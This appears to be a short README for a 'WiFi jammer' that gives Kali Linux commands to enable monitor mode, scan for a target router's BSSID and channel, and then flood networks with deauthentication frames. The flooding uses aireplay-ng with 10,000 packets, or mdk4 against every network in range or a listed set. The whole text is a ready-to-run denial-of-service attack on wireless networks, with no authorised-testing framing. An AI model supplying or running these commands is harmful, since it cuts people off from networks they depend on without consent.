# GPWA-V1.0.0 (A Wifi Jammer)

### GPWA Command For Kali Linux

```bash
### 🔧 Command For Monitor Mode:

- sudo ip link set wlan0 down
- sudo iw dev wlan0 set type monitor
- sudo ip link set wlan0 up

## shortcut Command:
- sudo airmon-ng start wlan0

## Nearby Wifi Nerwork Scan Command (Copy Target WIFI BSSID And Channel Number)
- sudo airodump-ng wlan0mon

## Jammer Run (Open New Terminal)
- sudo aireplay-ng --deauth 10000 -a <Router_BSSID> wlan0mon

## Advanced Jammer Install Command
- sudo apt update
- sudo apt install mdk4

## Advanced Jammer Run (mdk4)
- sudo mdk4 wlan0mon d

## Advanced Jammer Run With Target BSSID (Write BSSID In Blacklist.txt)
- sudo mdk4 wlan0mon d -b Blacklist.txt

